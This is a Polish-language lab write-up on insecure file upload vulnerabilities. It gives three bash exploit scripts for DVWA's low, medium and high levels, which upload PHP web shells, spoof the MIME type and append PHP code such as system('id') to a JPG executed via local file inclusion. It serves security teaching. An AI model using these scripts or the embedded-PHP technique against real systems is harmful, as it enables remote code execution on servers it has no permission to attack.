# Insecure File Upload
## Opis techniki
<blockquote>Insecure File Upload odnosi się do podatności w aplikacjach internetowych, w których podczas procesu uploadu plików nie są przeprowadzane odpowiednie sprawdzenia i walidacja, co pozwala atakującym na przesyłanie złośliwych plików na serwer. Podatność ta może mieć poważne konsekwencje, ponieważ może prowadzić do różnych form ataków, w tym zdalnego wykonania kodu, odmowy usługi lub nieautoryzowanego dostępu do poufnych informacji.

Oto kilka kluczowych cech i zagrożeń związanych z niezabezpieczonym przesyłaniem plików:

* Brak odpowiedniej walidacji typu pliku: Aplikacje internetowe często umożliwiają użytkownikom przesyłanie plików, takich jak obrazy, dokumenty lub pliki multimedialne. Jeśli jednak aplikacja nie zweryfikuje odpowiednio typu pliku, atakujący może przesłać plik ze złośliwym rozszerzeniem lub ukrytą zawartością.
* Omijanie kontroli rozszerzeń plików: Niektóre aplikacje polegają wyłącznie na rozszerzeniach plików w celu określenia ich typu. Atakujący mogą wykorzystać tę słabość, przesyłając złośliwy plik z nieszkodliwym rozszerzeniem, na przykład przesyłając plik PHP z rozszerzeniem .jpg.
* Niewystarczająca walidacja zawartości pliku: Oprócz sprawdzania typu pliku, kluczowe znaczenie ma walidacja zawartości przesyłanych plików. Atakujący mogą manipulować zawartością pliku, aby dołączyć złośliwe skrypty lub kod wykonywalny, który można wykonać na serwerze.
* Nieprawidłowa konfiguracja serwera: Nieprawidłowa konfiguracja serwera, taka jak zezwolenie na umieszczanie plików wykonywalnych w określonych katalogach lub przyznanie niewłaściwych uprawnień do przesyłanych plików, może prowadzić do wykonania dowolnego kodu lub nieautoryzowanego dostępu.</blockquote>

## DVWA labs

- [DVWA Insecure File Upload #1 - Low](#dvwa-file-upload-1---low)

- [DVWA Insecure File Upload #2 - Medium](#dvwa-file-upload-2---medium)

- [DVWA Insecure File Upload #3 - High](#dvwa-file-upload-3---high)


<br/>

## DVWA Insecure File Upload #1 - Low
Na niskim poziomie trudności musimy mieć na uwadze następujące cechy laboratorium:
* Typ pliku nie jest w ogóle sprawdzany

#### Dane wejściowe:
| No. | Opis | Typ | Przykładowa wartość |
|------|-------------|------|---------------|
| 1 | DVWA base url | url | 10.10.10.10|
| 2 | testowy plik PHP | plik | test.php|

#### Skrypt w `bash` 

```bash
#!/bin/bash

# Function to display usage instructions
display_usage() {
  echo "Usage: $0 <base_url> <php_filename>"
  echo "Description: This script attempts to upload and execute a malicious PHP file using the insecure file upload functionality"
  echo "Arguments:"
  echo "  <base_url>      Base URL of the target application"
  echo "  <php_filename>  PHP file to be uploaded and executed"
}

# Check if the required number of arguments are provided
if [[ $# -ne 2 ]]; then
  display_usage
  exit 1
fi

get_cookie() {
  csrf=$(curl -s -x "http://127.0.0.1:8080" -c dvwa.cookie "$1/login.php?security=low&Login=Login&username=admin&password=password" | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)
  sed -i 's/impossible/low/' dvwa.cookie
  curl -s -b dvwa.cookie -d "username=admin&password=password&user_token=${csrf}&Login=Login" "$1/login.php"
}

upload_file() {
  curl -s -x "http://127.0.0.1:8080" -X POST "$1/vulnerabilities/upload/" -b dvwa.cookie -F "uploaded=@$2;filename=$2" > /dev/null
}

execute_payload() {
  curl -sS -x "http://127.0.0.1:8080" -b dvwa.cookie "$1/hackable/uploads/$2"
}

# Check if the necessary arguments are provided
if [[ -z $1 || -z $2 ]]; then
  display_usage
  exit 1
fi

# Get cookie
get_cookie "$1"
upload_file "$1" "$2"
execute_payload "$1" "$2"
```

#### Efekt działania skryptu:
![alt text](https://github.com/249064/CBE-BAW-2023/raw/main/res/upload_low.gif "Po uruchomieniu skrypt wgrywa wskazany plik na serwer i zwraca jego wynik odwołując się bezpośrednio do pliku")


#### Czyszczenie pozostałości po wykonaniu skryptu:
```bash
rm ./dvwa.cookie
```


<br/>

<br/>
<br/>

## DVWA Insecure File Upload #2 - Medium
Na średnim poziomie trudności musimy mieć na uwadze następujące cechy laboratorium:
* Sprawdzany jest zadeklarowany typ pliku
* NIE jest sprawdzane rozszerzenie, ani sygnatura

#### Dane wejściowe:
| No. | Opis | Typ | Przykładowa wartość |
|------|-------------|------|---------------|
| 1 | DVWA base url | url | 10.10.10.10|
| 2 | testowy plik PHP | plik | test.php|

#### Skrypt w `bash` 

```bash
#!/bin/bash

# Function to display usage instructions
display_usage() {
  echo "Usage: $0 <base_url> <php_filename>"
  echo "Description: This script attempts to upload and execute a malicious PHP file using the insecure file upload functionality"
  echo "Arguments:"
  echo "  <base_url>      Base URL of the target application"
  echo "  <php_filename>  PHP file to be uploaded and executed"
}

# Check if the required number of arguments are provided
if [[ $# -ne 2 ]]; then
  display_usage
  exit 1
fi

get_cookie() {
  csrf=$(curl -s -x "http://127.0.0.1:8080" -c dvwa.cookie "$1/login.php?security=medium&Login=Login&username=admin&password=password" | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)
  sed -i 's/impossible/medium/' dvwa.cookie
  curl -s -b dvwa.cookie -d "username=admin&password=password&user_token=${csrf}&Login=Login" "$1/login.php"
}

upload_file() {
  curl -s -x "http://127.0.0.1:8080" -X POST "$1/vulnerabilities/upload/" -b dvwa.cookie -F 'MAX_FILE_SIZE=100000' -F "uploaded=@$2;filename=$2;type=image/jpeg" -F 'Upload=Upload' > /dev/null
}

execute_payload() {
  curl -sS -x "http://127.0.0.1:8080" -b dvwa.cookie "$1/hackable/uploads/$2"
}

# Check if the necessary arguments are provided
if [[ -z $1 || -z $2 ]]; then
  display_usage
  exit 1
fi

# Get cookie
get_cookie "$1"
upload_file "$1" "$2"
execute_payload "$1" "$2"
```

#### Efekt działania skryptu:
![alt text](https://github.com/249064/CBE-BAW-2023/raw/main/res/upload_medium.gif "Po uruchomieniu skrypt wgrywa wskazany plik na serwer i zwraca jego wynik odwołując się bezpośrednio do pliku")


#### Czyszczenie pozostałości po wykonaniu skryptu:
```bash
rm ./dvwa.cookie
```


<br/>

<br/>
<br/>

## DVWA Insecure File Upload #3 - High
Na wysokim poziomie trudności musimy mieć na uwadze następujące cechy laboratorium:
* Sprawdzany jest zadeklarowany typ pliku
* Sprawdzane jest rozszerzenie pliku oraz sygnatura

#### Dane wejściowe:
| No. | Opis | Typ | Przykładowa wartość |
|------|-------------|------|---------------|
| 1 | DVWA base url | url | 10.10.10.10|
| 2 | prawidłowy plik JPG | plik | test.jpg|
| 3 | kod PHP | string | system("id"); |

#### Skrypt w `bash` 

```bash
#!/bin/bash

# Function to display usage instructions
display_usage() {
  echo "Usage: $0 <base_url> <jpg filename> <php command>"
  echo "Description: This script attempts to upload and execute a malicious file with embedded PHP code using the insecure file upload functionality"
  echo "Arguments:"
  echo "  <base_url>      Base URL of the target application"
  echo "  <jpg filename>  Any proper jpg image"
  echo "  <php command>   PHP command to be executed (without php tags, but WITH trailing semicolon)"
}

# Check if the required number of arguments are provided
if [[ $# -ne 3 ]]; then
  display_usage
  exit 1
fi

get_cookie() {
  csrf=$(curl -s -x "http://127.0.0.1:8080" -c dvwa.cookie "$1/login.php?security=high&Login=Login&username=admin&password=password" | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)
  sed -i 's/impossible/high/' dvwa.cookie
  curl -s -b dvwa.cookie -d "username=admin&password=password&user_token=${csrf}&Login=Login" "$1/login.php"
}

upload_file() {
  jpg_file="$2"
  filename="${jpg_file%.*}_temp.${jpg_file##*.}"
  [ -f "$filename" ] && rm "$filename"
  cp "$2" "$filename"
  echo "<?php echo \"<bawtag>\"; $3 echo \"</bawtag>\";?>" >> "$filename"
  curl -s -x "http://127.0.0.1:8080" -X POST "$1/vulnerabilities/upload/" -b dvwa.cookie -F 'MAX_FILE_SIZE=100000' -F "uploaded=@${filename};filename=$filename;type=image/jpeg" -F 'Upload=Upload' > /dev/null
  [ -f "$filename" ] && rm "$filename"
}

execute_payload() {
  curl -sS -x "http://127.0.0.1:8080" -b dvwa.cookie "$1/vulnerabilities/fi/?page=file:///usr/share/dvwa/hackable/uploads/$filename" | awk -v RS="<bawtag>" 'NR > 1 {gsub(/<\/bawtag>.*/, ""); print}' | grep .
#sed -n -z 's/.*<bawtag>\(.*\)<\/bawtag>.*/\1/p'
}

# Check if the necessary arguments are provided
if [[ -z $1 || -z $2 || -z $3 ]]; then
  display_usage
  exit 1
fi

# Get cookie
get_cookie "$1"

upload_file "$1" "$2" "$3"

execute_payload "$1" "$filename"

```

#### Efekt działania skryptu:
![alt text](https://github.com/249064/CBE-BAW-2023/raw/main/res/upload_high.gif "Po uruchomieniu skrypt wgrywa wskazany plik na serwer i zwraca jego wynik korzystając z podatności LFI")


#### Czyszczenie pozostałości po wykonaniu skryptu:
```bash
rm ./dvwa.cookie
```


<br/>
